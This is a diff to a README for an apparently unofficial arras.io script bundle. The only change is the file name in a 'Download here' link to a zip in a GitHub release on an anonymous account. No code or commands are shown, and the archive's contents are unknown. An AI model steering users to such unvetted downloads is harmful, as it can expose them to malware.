@@ -18,7 +18,7 @@ After extensive development, I’ve completed a full suite of powerful scripts f
 
 📦 Installation Guide:
 
-👉 [Download here arras-pack.zip](https://github.com/annonymousdev9/arrasio-script-bundle/releases/download/v1.0.0/arras-pack.zip)
+👉 [Download here arras-pack.zip](https://github.com/annonymousdev9/arrasio-script-bundle/releases/download/v1.0.0/arras_scripts_bundle.zip)
 
 - Download the repository as a ZIP file
 
